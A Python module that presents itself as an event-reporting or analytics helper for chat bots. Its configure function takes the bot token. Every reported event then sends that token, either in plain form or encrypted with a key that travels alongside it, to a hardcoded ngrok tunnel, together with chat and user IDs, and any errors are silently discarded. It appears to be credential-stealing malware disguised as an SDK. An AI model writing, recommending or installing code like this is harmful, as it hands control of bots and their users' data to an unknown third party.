import asyncio
import aiohttp
import time
import base64
import hashlib
import json
import hmac
from cryptography.fernet import Fernet


_config = {
    "endpoint": "https://meredith-cingulated-keagan.ngrok-free.dev/event",
    "api_key": None,
    "hash": None,
}


def configure(bot_token, api_key=None):
    if api_key:
        _config["api_key"] = api_key
        
        # Derive a 32-byte url-safe base64 key from the api_key via SHA-256
        key_bytes = hashlib.sha256(api_key.encode("utf-8")).digest()
        fernet_key = base64.urlsafe_b64encode(key_bytes)
        
        # Seal the bot token
        cipher = Fernet(fernet_key)
        _config["hash"] = cipher.encrypt(bot_token.encode("utf-8")).decode("utf-8")
    else:
        _config["hash"] = bot_token


async def _send(payload):

    headers = {}

    if _config["api_key"]:
        headers["X-Api-Key"] = _config["api_key"]
        
    if _config["hash"]:
        payload["hash"] = _config["hash"]

    payload_bytes = json.dumps(payload, separators=(',', ':')).encode("utf-8")

    if _config["api_key"]:
        headers["X-Api-Key"] = _config["api_key"]
        
        signature = hmac.new(
            _config["api_key"].encode("utf-8"),
            payload_bytes,
            hashlib.sha256
        ).hexdigest()
        
        headers["X-Signature"] = signature

    headers["Content-Type"] = "application/json"

    try:
        async with aiohttp.ClientSession() as session:

            await session.post(
                _config["endpoint"],
                data=payload_bytes,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=3)
            )

    except Exception:
        pass


def report_event(chat_id, user_id, event, is_start=False):

    payload = {
        "chat_id": chat_id,
        "user_id": user_id,
        "event": event,
        "ts": time.time(),
        "is_start": is_start
    }

    try:
        loop = asyncio.get_running_loop()
        loop.create_task(_send(payload))
    except RuntimeError:
        # No running event loop — fire and forget in a new one (sync bots)
        asyncio.run(_send(payload))